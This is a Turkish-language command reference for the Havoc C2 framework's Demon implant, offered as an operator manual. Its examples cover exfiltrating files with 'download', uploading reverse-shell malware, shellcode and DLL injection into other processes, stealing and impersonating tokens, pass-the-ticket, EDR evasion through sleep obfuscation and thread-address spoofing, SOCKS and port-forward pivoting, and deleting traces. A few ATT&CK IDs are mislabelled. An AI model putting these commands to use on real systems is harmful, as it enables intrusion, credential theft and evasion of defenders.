# Havoc Demon - Genişletilmiş Komut Dokümantasyonu (Türkçe)

Orijinal Proje Linki: [https://github.com/havocframework/havoc](https://github.com/havocframework/havoc)

---

### help
Belirtilen komutun yardım mesajını gösterir.
**Kullanım:** `help [komut]`
Ajan (Demon) içerisinde bulunan herhangi bir komut veya modül hakkında sistem içi yardım ve kullanım detaylarını listeler. Parametre girilmezse tüm komutların listesini döner.
**Örnekler:**
- `help`
- `help inline-execute`
- `help token`

### sleep
Uyku gecikmesini ve sapma (jitter) süresini ayarlar.
**Kullanım:** `sleep [gecikme] (sapma)`
Demon'un Teamserver (komuta sunucusu) ile iletişim kurma (check-in) aralığını belirler. "Jitter" parametresi yüzde cinsinden belirtilir ve ağdaki düzenli trafik paternini bozarak güvenlik sistemlerinden gizlenmeye (T1029, TA0005) yardımcı olur.
**Örnekler:**
- `sleep 10` (Her 10 saniyede bir bağlanır)
- `sleep 60 15` (60 saniye ortalama bekleme süresi, %15 rastgele sapma)

### checkin
Acil bağlantı isteği (check-in) gönderir.
**Kullanım:** `checkin`
Mevcut uyku döngüsünü beklemeden sunucuyla anında iletişim kurar. Kuyruktaki görevleri almak veya ajan durumunu hızlıca güncellemek için kullanılır.
**Örnekler:**
- `checkin`

### job list
Aktif arka plan işlerinin (jobs) listesini gösterir.
**Kullanım:** `job list`
Demon üzerinde arka planda asenkron olarak çalışan mevcut tüm işlemleri listeler. İş numarası (job id) ve durumları hakkında bilgi verir. Sadece API üzerinden çalışır.
**Örnekler:**
- `job list`

### job suspend
Belirtilen kimliğe sahip arka plan işini askıya alır.
**Kullanım:** `job suspend [id]`
Çalışmakta olan bir arka plan görevini geçici olarak duraklatır. İşlem sonlandırılmaz, ancak resume komutu verilene kadar durdurulur.
**Örnekler:**
- `job suspend 1337`

### job resume
Askıya alınmış bir arka plan işini devam ettirir.
**Kullanım:** `job resume [id]`
Daha önceden `job suspend` komutuyla durdurulmuş olan arka plan işlemini kaldığı yerden tekrar başlatır.
**Örnekler:**
- `job resume 1337`

### job kill
Belirtilen kimliğe sahip arka plan işini sonlandırır.
**Kullanım:** `job kill [id]`
Çalışan veya askıya alınmış bir arka plan işlemini tamamen iptal eder ve bellekten temizler.
**Örnekler:**
- `job kill 1337`

### task list
Görev kuyruğundaki komutların listesini görüntüler.
**Kullanım:** `task list`
Sunucu tarafında (Teamserver) ajanın henüz almadığı veya sıraya konmuş çalıştırılmayı bekleyen komutları listeler.
**Örnekler:**
- `task list`

### task clear
Görev kuyruğundaki tüm komutları temizler.
**Kullanım:** `task clear`
Ajan tarafından henüz alınmamış ve çalıştırılmamış tüm bekleyen görevleri sunucu tarafında iptal ederek sırayı boşaltır. Yanlış girilen veya geciken komut yığınlarını engellemek için idealdir.
**Örnekler:**
- `task clear`

### proc list
Hedef üzerindeki çalışan süreçlerin listesini görüntüler.
**Kullanım:** `proc list`
Hedef makinede o an aktif olan süreçleri (Process ID, isim, mimari vb.) detaylı olarak listeler. Process Discovery (T1057) tekniğini kullanarak sistemdeki uygulamaları tanımlar.
**Örnekler:**
- `proc list`

### proc kill
Belirtilen PID'ye sahip süreci sonlandırır.
**Kullanım:** `proc kill [pid]`
Hedef sistemde çalışan, işlem numarası (PID) verilmiş uygulamayı zorla kapatır. API tabanlı olarak çalıştığı için doğrudan süreç sonlandırma talebi yollar (TA0040).
**Örnekler:**
- `proc kill 1337`
- `proc kill 4092`

### proc create
Yeni bir süreç (process) başlatır.
**Kullanım:** `proc create [normal/suspended] (--silent) (--no-pipe) [süreç] (argümanlar)`
Hedef sistemde isteğe bağlı olarak normal veya askıya alınmış (suspended) halde yeni bir uygulama başlatır (T1106). `suspended` parametresi process injection işlemleri için kullanışlıdır.
**Örnekler:**
- `proc create suspended --no-pipe C:\Windows\System32\notepad.exe`
- `proc create normal cmd.exe /c whoami`

### proc modules
Uzak bir sürecin yüklediği modülleri/dll'leri listeler.
**Kullanım:** `proc modules [pid]`
İşlem numarası verilen sürecin bellek alanına yüklemiş olduğu DLL'leri ve hafıza modüllerini listeler. Güvenlik yazılımlarının süreçlere kanca (hook) atıp atmadığını kontrol etmek için kullanılabilir (TA0007).
**Örnekler:**
- `proc modules 1337`

### proc grep
Belirtilen uzak süreçten belirli bilgileri filtreler/arar.
**Kullanım:** `proc grep [süreç adı]`
Adı belirtilen uygulamanın bellek ve süreç listesi içerisindeki tüm örneklerini bulur. Gelişmiş süreç aramaları için Process Discovery (T1020) tekniklerinden faydalanır.
**Örnekler:**
- `proc grep explorer.exe`
- `proc grep svchost.exe`

### proc memory
Bellek bölgeleri (memory regions) için sorgulama yapar.
**Kullanım:** `proc memory [pid] [izin türü]`
Belirtilen süreç (PID) üzerinde, verilen bellek izni (PAGE_READWRITE, PAGE_EXECUTE_READWRITE vb.) filtrelerine uygun olan hafıza bölgelerini sorgular. Shellcode enjeksiyonu öncesi bellek analizi (T1055) için kritiktir.
**Örnekler:**
- `proc memory 1337 PAGE_EXECUTE_READWRITE`
- `proc memory 4092 PAGE_READWRITE`

### transfer list
Mevcut indirme işlemlerini listeler.
**Kullanım:** `transfer list`
Ajan üzerinden indirilmekte veya karşıya yüklenmekte olan dosya transferlerini (File ID'leri ile birlikte) görüntüler.
**Örnekler:**
- `transfer list`

### transfer stop
Bir indirme işlemini durdurur.
**Kullanım:** `transfer stop <DosyaID>`
Dosya kimliği (FileID) belirtilen mevcut bir transfer işlemini güvenli şekilde iptal eder ve durdurur.
**Örnekler:**
- `transfer stop ffff`

### transfer resume
Duraklatılmış bir indirme işlemini devam ettirir.
**Kullanım:** `transfer resume <DosyaID>`
Önceden durdurulmuş bir dosya indirme/yükleme transferini kaldığı yerden devam ettirir.
**Örnekler:**
- `transfer resume ffff`

### transfer remove
Bir indirme işlemini durdurur ve listeden siler.
**Kullanım:** `transfer remove <DosyaID>`
Devam eden bir dosya transferini iptal eder ve aktarım geçmişi listesinden tamamen kaldırır.
**Örnekler:**
- `transfer remove ffff`

### dir
Belirtilen dizinin içeriğini listeler.
**Kullanım:** `dir [/dizin/yolu] [/s] [/b] [/d] [/f] [/starts foo] [/contains foo] [/ends foo]`
Dosya sistemi keşfi (T1083) için kullanılır. Çeşitli filtrelerle alt klasörleri de tarayabilir (`/s`), belirli kelimelerle başlayan, biten veya o kelimeyi içeren dosyaları bulabilir.
**Örnekler:**
- `dir C:\Users /s /b /f /ends .ps1`
- `dir C:\Windows\Temp`

### download
Belirtilen bir dosyayı indirir.
**Kullanım:** `download [/dosya/yolu.txt]`
Hedef sistemden bir dosyayı okur ve Teamserver'a (C2 sunucusuna) indirir. API seviyesinde çalışarak sessizce dosya sızdırılmasını sağlar.
**Örnekler:**
- `download c:\secrets.txt`
- `download C:\Users\Admin\Desktop\passwords.docx`

### upload
Belirtilen bir dosyayı hedef makineye yükler.
**Kullanım:** `upload [/yerel/dosya] [/uzak/hedef/yol]`
C2 sunucusundan hedef sisteme belirtilen dizine bir dosya aktarır (örneğin zararlı yazılım, araç veya komut dosyası yüklemek için).
**Örnekler:**
- `upload /tmp/reverse_shell.exe c:\Windows\Temp\malware.exe`

### cd
Belirtilen dizine geçiş yapar (Change Directory).
**Kullanım:** `cd [/gecilecek/dizin]`
Ajanın çalışmakta olduğu geçerli dosya dizinini değiştirir. API tabanlı bir işlemdir ve mevcut işlemi diğer komutlar için referans yapar.
**Örnekler:**
- `cd C:\Users\Admin\Documents`
- `cd C:\`

### cp
Dosyayı bir konumdan diğerine kopyalar.
**Kullanım:** `cp [kaynak_dosya] [hedef_dosya]`
Hedef sistemdeki bir dosyayı alır ve belirtilen yeni bir hedef konuma çoğaltır. Veri toplama ve gizleme işlemlerinde kullanılır.
**Örnekler:**
- `cp C:\secrets.txt C:\Windows\Temp\secrets.txt`

### mv
Dosyayı bir konumdan diğerine taşır.
**Kullanım:** `mv [kaynak_dosya] [hedef_dosya]`
Dosyayı orijinal konumundan silerek yeni hedefine aktarır. Dosya adını değiştirmek için de kullanılabilir.
**Örnekler:**
- `mv C:\secrets.txt C:\Windows\Temp\hidden.txt`

### remove
Dosyayı veya klasörü siler.
**Kullanım:** `remove [dosya_veya_klasör_yolu]`
Hedef sistemdeki gereksiz izleri silmek veya kalıntı bırakmamak adına belirtilen dizini veya dosyayı tamamen kaldırır.
**Örnekler:**
- `remove C:\Windows\Temp\malware.exe`

### mkdir
Yeni bir klasör (dizin) oluşturur.
**Kullanım:** `mkdir [/yeni/klasör/yolu]`
Hedef dosya sisteminde yeni bir dizin (klasör) meydana getirir.
**Örnekler:**
- `mkdir C:\Windows\Temp\NewDir`

### pwd
Geçerli çalışma dizinini görüntüler (Print Working Directory).
**Kullanım:** `pwd`
Ajanın komutları şu anda hedef bilgisayarın hangi klasöründen yürüttüğünü gösterir.
**Örnekler:**
- `pwd`

### cat
Belirtilen dosyanın içeriğini terminale yazdırır.
**Kullanım:** `cat [/dosya/yolu.txt]`
Metin dosyalarının içindeki veriyi okuyarak ajan çıktısı olarak ekrana basar. Özellikle yapılandırma ve şifre dosyalarını okumak için tasarlanmıştır.
**Örnekler:**
- `cat c:\secrets.txt`

### screenshot
Ekran görüntüsü alır.
**Kullanım:** `screenshot`
Hedef bilgisayarın masaüstü ekranının o anki görüntüsünü çeker ve C2 sunucusuna (Teamserver) aktarır.
**Örnekler:**
- `screenshot`

### shell
cmd.exe üzerinden komut çalıştırıp çıktıyı alır.
**Kullanım:** `shell [komutlar]`
Windows komut istemcisi (cmd.exe) üzerinden process oluşturma davranışı (Process Creation) ile komut çalıştırır. Çıktı doğrudan operatöre gönderilir.
**Örnekler:**
- `shell dir c:\windows\system32`
- `shell whoami /all`

### powershell
powershell.exe üzerinden komut çalıştırıp çıktıyı alır.
**Kullanım:** `powershell [komutlar]`
Hedef sistemin PowerShell aracını kullanarak komut çalıştırır. Zengin betik dili yeteneklerini çalıştırmak için idealdir.
**Örnekler:**
- `powershell Get-Process`
- `powershell dir c:\windows\system32`

### inline-execute
Derlenmiş bir Object File (BOF) dosyasını çalıştırır.
**Kullanım:** `inline-execute [/obj_dosya_yolu.o] (argümanlar)`
Beacon Object Files (BOF) benzeri yapıları ajanın (Demon) kendi bellek alanı içinde çalıştırır. Yeni bir süreç oluşturmadığı (API Only) için tespit edilmesi son derece güçtür.
**Örnekler:**
- `inline-execute /tmp/whoami.x64.o`
- `inline-execute /tmp/objectfile.x64.o hello`

### shellcode inject
Uzak bir sürece shellcode enjekte eder.
**Kullanım:** `shellcode inject [mimari] [hedef pid] [/shellcode_yolu.bin]`
Çalışmakta olan uzak bir uygulamanın (Process Injection, T1055) belleğine raw (işlenmemiş) shellcode verisini aktarır ve çalıştırır.
**Örnekler:**
- `shellcode inject x64 1337 /tmp/rev_shell.x64.bin`

### shellcode spawn
Geçici bir süreç başlatıp içine shellcode enjekte eder.
**Kullanım:** `shellcode spawn [mimari] [/shellcode_yolu.bin]`
"Fork & Run" tekniğini (T1055.002) kullanarak geçici, zararsız görünen (örneğin rundll32.exe) yeni bir süreç yaratır, içine shellcode sızdırır ve çalıştırır. Çökme durumunda ana ajan zarar görmez.
**Örnekler:**
- `shellcode spawn x64 /tmp/rev_shell.x64.bin`

### shellcode execute
Mevcut sürecin içerisine shellcode enjekte edip çalıştırır.
**Kullanım:** `shellcode execute [mimari] [/shellcode_yolu.bin]`
Ajanın bizzat kendi bellek boşluğuna (self-inject) shellcode yazar ve yeni bir iplik (thread) açarak bunu yürütür.
**Örnekler:**
- `shellcode execute x64 /tmp/rev_shell.x64.bin`

### dll inject
Uzak bir sürece DLL enjekte eder.
**Kullanım:** `dll inject [hedef pid] [/modül_yolu.dll] (argümanlar)`
Çalışan bir işlemin bellek alanına Reflective DLL enjeksiyon (T1055.001) tekniği kullanarak bir kütüphane yükler ve çalıştırır.
**Örnekler:**
- `dll inject 1337 /tmp/module.dll argument`

### dll spawn
Geçici bir süreç yaratır ve içerisine DLL enjekte eder.
**Kullanım:** `dll spawn [/modül_yolu.dll] (argümanlar)`
Tıpkı shellcode spawn gibi "Fork & Run" prensibiyle yeni süreç oluşturup DLL'i bu sürece yansıtarak (reflective load) güvenli çalışma sağlar.
**Örnekler:**
- `dll spawn /tmp/module.dll arguments`

### exit
Ajanı temizler ve sonlandırır.
**Kullanım:** `exit [thread/process]`
Çalışan Demon ajanını ve bellek izlerini temizleyerek mevcut iş parçacığını (thread) veya tüm işlemi (process) tamamen kapatır.
**Örnekler:**
- `exit thread`
- `exit process`

### token getuid
Mevcut token'daki kullanıcı kimliğini getirir.
**Kullanım:** `token getuid`
Access Token Manipulation (T1134) dahilinde ajanın şu anda hangi kullanıcı token'ı ve yetkileri altında çalıştığını gösterir.
**Örnekler:**
- `token getuid`

### token list
Token kasasındaki çalıntı token'ları listeler.
**Kullanım:** `token list`
Ajan tarafından sistemden başarılı bir şekilde kopyalanmış ve "Token Vault" içerisinde bekletilen tüm çalınmış token'ların listesini gösterir.
**Örnekler:**
- `token list`

### token find
Sistemdeki çalınabilecek tüm token'ları tespit eder.
**Kullanım:** `token find`
T1134 tekniği ile sistemdeki süreçleri tarar, ayrıcalık yükseltmek (Privilege Escalation) için taklit edilebilecek açık token yetkilerini tespit eder.
**Örnekler:**
- `token find`

### token steal
Belirtilen süreçten token çalar ve token kasasına kaydeder.
**Kullanım:** `token steal [pid] (handle)`
Yüksek yetkili bir sürecin token'ını çalar (T1134.001) ve daha sonra kullanılmak üzere kimlik kasasına alır.
**Örnekler:**
- `token steal 1337`

### token impersonate
Belirtilen kasa ID'sindeki çalıntı token'ı taklit eder.
**Kullanım:** `token impersonate [kasa id]`
Vault'ta saklanan belirli bir kimliği kuşanarak, ajanın o kullanıcının yetkileriyle (örneğin SYSTEM) işlem yapmasını (TA0004) sağlar.
**Örnekler:**
- `token impersonate 0`

### token make
Kullanıcı kimlik bilgileriyle yeni bir token oluşturur.
**Kullanım:** `token make [Alan Adı] [Kullanıcı] [Şifre] (OturumTürü)`
Verilen düz metin şifreler ile sisteme bir ağ oturumu (veya belirtilen başka bir logon türü) açarak geçerli bir token üretir (T1134.003).
**Örnekler:**
- `token make domain.local Administrator Passw0rd@1234`
- `token make . User1 Password! LOGON_INTERACTIVE`

### token privs-list
Mevcut token'daki tüm ayrıcalıkları listeler.
**Kullanım:** `token privs-list`
Hesabın sahip olduğu Windows ayrıcalıklarını (SeDebugPrivilege, SeImpersonatePrivilege vb.) görüntüleyerek sistemdeki potansiyel gücü (TA0007) analiz eder.
**Örnekler:**
- `token privs-list`

### token privs-get
Bir ayrıcalığı etkinleştirir.
**Kullanım:** `token privs-get [Ayrıcalık]`
Mevcut token'da bulunan ancak pasif durumdaki bir Windows ayrıcalığını aktif hale getirir (T1134).
**Örnekler:**
- `token privs-get SeDebugPrivilege`

### token revert
Varsayılan işlem token'ına geri döner.
**Kullanım:** `token revert`
Eğer bir token taklit edildiyse (impersonate), o yetkileri bırakır ve ajanın ilk başladığı orijinal işlem token'ına geri döndürür.
**Örnekler:**
- `token revert`

### token remove
Belirtilen çalıntı token'ı kasadan siler.
**Kullanım:** `token remove [kasa id]`
Gereksiz veya geçersiz olan bir token'ı yerel bellek kasasından kaldırır.
**Örnekler:**
- `token remove 1`

### token clear
Token kasasındaki tüm çalıntı token'ları temizler.
**Kullanım:** `token clear`
Sistemden kopyalanmış ve depolanmış olan tüm token verilerini güvenli bir şekilde silerek kimlik kasasını boşaltır.
**Örnekler:**
- `token clear`

### dotnet list-versions
Yüklü veya kullanılabilir .NET sürümlerini listeler.
**Kullanım:** `dotnet list-versions`
Hedef makinede hangi .NET Framework (CLR) sürümlerinin yüklü olduğunu keşfederek uygun uyumluluk seviyesini belirler.
**Örnekler:**
- `dotnet list-versions`

### dotnet inline-execute
Geçerli süreçte bir .NET assemblesi (uygulama) çalıştırıp çıktıyı alır.
**Kullanım:** `dotnet inline-execute [/uygulama_yolu.exe] (argümanlar)`
Bir .NET PE dosyasını (.exe) doğrudan ajanın kendi bellek alanına yükler ve Execute Assembly tekniği (T1620) ile (bellek içi çalıştırarak) tespit edilmeden çıktıyı geri döndürür.
**Örnekler:**
- `dotnet inline-execute /tmp/Seatbelt.exe -group=all -full`

### net domain
Geçerli makinenin dahil olduğu domain (etki alanı) bilgisini gösterir.
**Kullanım:** `net domain`
Hedef cihazın bir Active Directory etki alanına katılıp katılmadığını ve ait olduğu domain ismini getirir.
**Örnekler:**
- `net domain`

### net logons
Bir bilgisayarda oturum açmış kullanıcıları listeler.
**Kullanım:** `net logons [\\HEDEF]`
Hedef (veya yerel) cihaz üzerinde geçmişte veya güncel olarak başarılı bir şekilde oturum açmış hesapları listeler.
**Örnekler:**
- `net logons \\localhost`
- `net logons \\DC01`

### net sessions
Bir bilgisayardaki açık ağ oturumlarını listeler.
**Kullanım:** `net sessions [\\HEDEF]`
Cihaz üzerinde dosya paylaşımlarına veya servislere aktif olarak kimlerin (ve hangi bilgisayarlardan) bağlandığını keşfeder.
**Örnekler:**
- `net sessions \\localhost`

### net share
Bir makinedeki paylaşılan dizinleri (shares) listeler.
**Kullanım:** `net share [\\HEDEF]`
Uzak veya yerel makinedeki gizli (C$, ADMIN$) ve açık ağ klasörlerinin paylaşım yollarını haritalar.
**Örnekler:**
- `net share \\localhost`
- `net share \\FILESERVER`

### net localgroup
Yerel grupları ve gruplardaki kullanıcıları listeler.
**Kullanım:** `net localgroup [\\HEDEF]`
Sistemdeki yerel grup yapılandırmalarını (Örn: Administrators grubu) çeker ve içindeki üyeleri gösterir.
**Örnekler:**
- `net localgroup \\localhost`

### net group
Domain gruplarını ve gruplardaki kullanıcıları listeler.
**Kullanım:** `net group [\\HEDEF]`
Hedefteki Active Directory etki alanında (veya belirtilen sunucuda) bulunan grupları sorgular. Domain Admin vb. tespiti için önemlidir.
**Örnekler:**
- `net group \\localhost`

### net users
Kullanıcıları ve kullanıcı bilgilerini listeler.
**Kullanım:** `net users [\\HEDEF]`
Hedef sistemdeki yerel veya etki alanı hesaplarının bir listesini ve profilleri ile ilgili temel bilgileri çeker.
**Örnekler:**
- `net users \\localhost`

### config implant.verbose
İmplant detaylı loglamasını (verbose logging) açar/kapatır.
**Kullanım:** `config implant.verbose [true/false]`
Süreç oluşturma, bellek tahsisi ve thread execution (iş parçacığı yürütme) gibi ajanın kendi içinde yaptığı hassas işlemleri ekrana detaylı olarak yazdırmasını sağlar. Hata ayıklama (debug) için kullanılır.
**Örnekler:**
- `config implant.verbose true`

### config implant.sleep-obf.start-addr
Uyku modu karmaşıklaştırmasında başlangıç adresini belirler.
**Kullanım:** `config implant.sleep-obf.start-addr [kütüphane!fonksiyon+ofset]`
Ajan uyku moduna geçtiğinde (sleep obfuscation), iz gizlemek için kullanılan işlemin sahte dönüş/başlangıç (thread start address) adresini belirler (Spoofing).
**Örnekler:**
- `config implant.sleep-obf.start-addr ntdll!LdrLoadLibrary+0x46`

### config implant.sleep-obf.technique
Uyku modu karmaşıklaştırma tekniğini ayarlar.
**Kullanım:** `config implant.sleep-obf.technique [0/1/2]`
Ajanın uykudayken bellekte kendini nasıl gizleyeceğini (obfuscation) belirler. 0: Normal Uyku (Gizleme yok), 1: Foliage (ROP tabanlı gizleme), 2: Ekko tekniği.
**Örnekler:**
- `config implant.sleep-obf.technique 1`
- `config implant.sleep-obf.technique 2`

### config implant.coffee.veh
Object file yüklemeleri için VEH'i (Vectored Exception Handler) açar/kapatır.
**Kullanım:** `config implant.coffee.veh [true/false]`
BOF dosyaları (Object File) çalıştırıldığında oluşabilecek hataların (crash) ajanı çökertmesini önlemek için VEH eklentisinin kullanılıp kullanılmayacağını ayarlar.
**Örnekler:**
- `config implant.coffee.veh true`

### config implant.coffee.threaded
Object dosyalarını yürütürken çoklu thread desteğini açar/kapatır.
**Kullanım:** `config implant.coffee.threaded [true/false]`
Object File dosyalarının ajanı bloke etmeden (multithreading kullanarak) arka planda yeni iş parçacıklarında çalışmasını sağlar.
**Örnekler:**
- `config implant.coffee.threaded true`

### config memory.alloc
Bellek tahsisi (memory allocation) davranışını ayarlar.
**Kullanım:** `config memory.alloc [1/2/3]`
Enjeksiyon veya tahsis işlemlerinde API çağrı tipini belirler. 1: Normal Win32 API (VirtualAllocEx), 2: Native API kullanır (NtAllocateVirtualMemory - güvenlik çözümlerini atlatmak için).
**Örnekler:**
- `config memory.alloc 2`

### config memory.execute
Bellek çalıştırma (execute) davranışını ayarlar.
**Kullanım:** `config memory.execute [1/2/3/4]`
Yeni tahsis edilen hafızanın nasıl yürütüleceğini belirler. 1: Win32 API (CreateRemoteThread), 2: Native API (NtCreateThreadEx).
**Örnekler:**
- `config memory.execute 2`

### config inject.spoofaddr
Kodu sahte (spoofed) bir iplik (thread) başlangıç adresiyle enjekte eder.
**Kullanım:** `config inject.spoofaddr [kütüphane!fonksiyon+ofset]`
Process Injection işlemleri sırasında EDR tespitlerini aşmak için (Thread Start Address Spoofing), iş parçacığının yasal bir Microsoft kütüphanesinden başlatılmış gibi görünmesini sağlar.
**Örnekler:**
- `config inject.spoofaddr ntdll!LdrLoadLibrary+0x46`

### config inject.spawn64
Fork & Run işlemleri için başlatılacak varsayılan 64-bit süreci belirler.
**Kullanım:** `config inject.spawn64 [C:\yol\uygulama.exe]`
Geçici işlem gerektiren durumlarda (shellcode spawn vb.) varsayılan olarak hangi güvenilir x64 Windows uygulamasının (örn: rundll32, werfault) kurban olarak seçileceğini tanımlar.
**Örnekler:**
- `config inject.spawn64 C:\Windows\System32\rundll32.exe`

### config inject.spawn32
Fork & Run işlemleri için başlatılacak varsayılan 32-bit süreci belirler.
**Kullanım:** `config inject.spawn32 [C:\yol\uygulama.exe]`
Geçici işlem gerektiren x86 (32-bit) mimari işlemleri için varsayılan kurban işlemini tanımlar.
**Örnekler:**
- `config inject.spawn32 C:\Windows\SysWow64\rundll32.exe`

### config killdate
KillDate (Kendini İmha Tarihi) değiştirir.
**Kullanım:** `config killdate [YIL-AY-GÜN SAAT-DAKİKA-SANİYE]`
Zararlı yazılımın ne zamana kadar aktif kalacağını belirler. Bu tarih GMT 0 (UTC) zaman dilimine göre hesaplanır. Süre dolduğunda ajan otomatik olarak kapanır. Devre dışı bırakmak için 0 kullanılır.
**Örnekler:**
- `config killdate 2006-01-02 15:04:05`
- `config killdate 0`

### config workinghours
Çalışma saatlerini (Working Hours) değiştirir.
**Kullanım:** `config workinghours [S:dd-S-dd]`
Ajanın yalnızca belirli saatler arasında (örneğin kurumsal mesai saatlerinde) aktif olmasını sağlar. Bu sayede ofis dışı trafik yaratmayarak dikkat çekmez. Kapatmak için 0 kullanılır.
**Örnekler:**
- `config workinghours 8:30-19:00`
- `config workinghours 0`

### pivot list
Bağlı olan pivot (atlama noktası) ajanlarını listeler.
**Kullanım:** `pivot list`
SMB/TCP üzerinden geçerli hedefe bağlanmış ve onu bir köprü/atlama noktası olarak kullanan alt ajanların durumunu gösterir. Sadece API üzerinden çalışır.
**Örnekler:**
- `pivot list`

### pivot connect
Bir pivot (atlama noktası) ajanına bağlanır.
**Kullanım:** `pivot connect [Hedef Host] [Bağlantı Adresi]`
Ajanlar arasında P2P (Eşler Arası) bağlantı kurarak, internet erişimi olmayan iç ağdaki cihazlara (diğer bir ajana) SMB/TCP pipe üzerinden köprü kurar.
**Örnekler:**
- `pivot connect HOST-DC agent_6d6e`

### pivot disconnect
Bir pivot (atlama noktası) ajanından bağlantıyı keser.
**Kullanım:** `pivot disconnect [Ajan ID]`
Eşler arası ağlarda, belirtilen alt veya üst ajanla olan iletişimi durdurarak ağı ayırır.
**Örnekler:**
- `pivot disconnect 64656d6e`

### rportfwd add
Ters bağlantı port yönlendirmesi (Reverse Port Forwarding) ekler.
**Kullanım:** `rportfwd add [dinleme_hostu] [dinleme_portu] [yönlendirme_hostu] [yönlendirme_portu]`
Hedef makinedeki iç ağ trafiğini ajan üzerinden alarak Teamserver'a veya dış ağdaki başka bir makineye iletmek için tünel açar.
**Örnekler:**
- `rportfwd add 0.0.0.0 8080 192.157.0.1 4444`

### rportfwd list
Tüm ters port yönlendirmelerini listeler.
**Kullanım:** `rportfwd list`
Oluşturulan aktif tünelleri (Reverse Port Forwarding) ve açık olan soket detaylarını listeler.
**Örnekler:**
- `rportfwd list`

### rportfwd remove
Ters port yönlendirmesini kapatır ve siler.
**Kullanım:** `rportfwd remove [Soket ID]`
Belirtilen Socket kimliğine ait açık olan tüneli/port yönlendirmesini koparır.
**Örnekler:**
- `rportfwd remove b4bbb42`

### rportfwd clear
Tüm ters port yönlendirmelerini kapatır ve temizler.
**Kullanım:** `rportfwd clear`
Aktif olan tüm tünelleme işlemlerini eşzamanlı olarak durdurur ve temizler.
**Örnekler:**
- `rportfwd clear`

### socks add
Yeni bir SOCKS5 vekil sunucusu (proxy) ekler.
**Kullanım:** `socks add [dinleme_portu]`
Saldırgan tarafında (veya ajanda) belirlenen bir port üzerinden ağ trafiğini hedef cihaza proxy (SOCKS5) olarak ileterek hedefin iç ağındaki makinelere tarayıcı üzerinden bile erişilmesini sağlar.
**Örnekler:**
- `socks add 4444`

### socks list
Tüm SOCKS5 proxy sunucularını listeler.
**Kullanım:** `socks list`
Ajan tarafından kurulan aktif durumdaki SOCKS5 proxy soketlerini gösterir.
**Örnekler:**
- `socks list`

### socks kill
SOCKS5 proxy sunucusunu kapatır ve siler.
**Kullanım:** `socks kill [dinleme_portu]`
Belirtilen yerel port üzerinde aktif olan proxy dinleyicisini iptal eder.
**Örnekler:**
- `socks kill 4444`

### socks clear
Tüm SOCKS5 proxy sunucularını kapatır ve temizler.
**Kullanım:** `socks clear`
Açık olan ve yönlendirilen bütün SOCKS5 vekil ağ servislerini sıfırlar.
**Örnekler:**
- `socks clear`

### luid
Mevcut oturum açma kimliğini (Logon ID) getirir.
**Kullanım:** `luid`
Geçerli token'a ait benzersiz oturum kimliğini (LUID - Locally Unique Identifier) yazdırır. Pass-the-Ticket (PtT) gibi işlemler için LUID gereklidir.
**Örnekler:**
- `luid`

### klist
Kerberos biletlerini (tickets) listeler.
**Kullanım:** `klist [/luid 0x123| /all]`
Verilen LUID'ye ait veya (bütün) hafızadaki önbelleğe alınmış Kerberos kimlik doğrulama biletlerini (TGT/TGS) dökerek Active Directory ağında yetki kontrolü sağlar.
**Örnekler:**
- `klist /all`
- `klist /luid 0x3e7`

### purge
Bir Kerberos biletini siler.
**Kullanım:** `purge /luid <0x123>`
Seçilen oturuma ait Kerberos biletlerini bellekten silerek (Purge) mevcut Active Directory yetkilendirmelerini sıfırlar veya olası ticket hatalarını temizler.
**Örnekler:**
- `purge /luid 0x123`

### ptt
Kerberos biletini oturuma dahil eder (Pass-the-Ticket).
**Kullanım:** `ptt <base64> [/luid <0x0>]`
Base64 formatında kodlanmış (örneğin Rubeus/Mimikatz ile çalınmış) bir Kerberos biletini hedef bellekteki mevcut veya belirtilen (LUID) oturuma enjekte ederek yetki yükseltimi sağlar.
**Örnekler:**
- `ptt doIFqjCCBaagAwIB...`
- `ptt doIFqjCCBaagAwIB... /luid 0x123`

---
Orijinal Proje Linki: [https://github.com/havocframework/havoc](https://github.com/havocframework/havoc)